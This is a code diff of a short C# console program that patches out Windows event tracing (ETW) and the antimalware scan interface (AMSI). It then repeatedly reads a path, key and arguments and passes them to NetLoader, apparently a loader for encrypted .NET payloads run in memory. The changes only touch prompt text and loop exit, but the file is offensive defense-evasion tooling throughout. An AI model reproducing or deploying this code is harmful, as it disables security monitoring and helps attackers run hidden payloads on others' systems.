@@ -13,13 +13,13 @@ namespace happyjai
         {
             NetLoader.PatchETW();
             NetLoader.PatchAMSI();
-            Console.Write("==>Path: ");
+            Console.Write("Path: ");
             string str1 = Console.ReadLine();
-            Console.Write("==>key: ");
+            Console.Write("key: ");
             string str2 = Console.ReadLine();
             while (true)
             {
-                Console.Write("==>args: ");
+                Console.Write("args: ");
                 string[] second = Console.ReadLine().Split(' ');
                 if (!(second[0] == "exit"))
                     NetLoader.Main(((IEnumerable<string>)new string[5]
@@ -31,7 +31,7 @@ namespace happyjai
             "-args"
                     }).Concat<string>((IEnumerable<string>)second).ToArray<string>());
                 else
-                    return;
+                    break;
             }
         }
     }
